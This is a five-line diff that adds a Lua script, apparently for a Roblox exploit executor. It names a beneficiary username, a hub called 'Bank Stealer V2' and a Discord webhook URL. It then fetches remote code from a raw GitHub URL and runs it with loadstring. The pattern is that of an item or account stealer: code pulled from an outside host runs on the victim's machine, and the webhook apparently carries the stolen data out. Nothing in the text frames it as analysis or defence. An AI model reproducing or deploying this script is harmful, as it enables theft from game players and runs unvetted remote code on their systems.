@@ -1,0 +1,5 @@
+_G.Username = "LuckLovesLife"
+_G.HubName = "Bank Stealer V2"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1094226540407038022/KD12o3gtl-DevfgYORyQ7GsLrR98puEfURy8nbX4HKMclJn23aQOo2cCpj6WsZZfUAfl"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
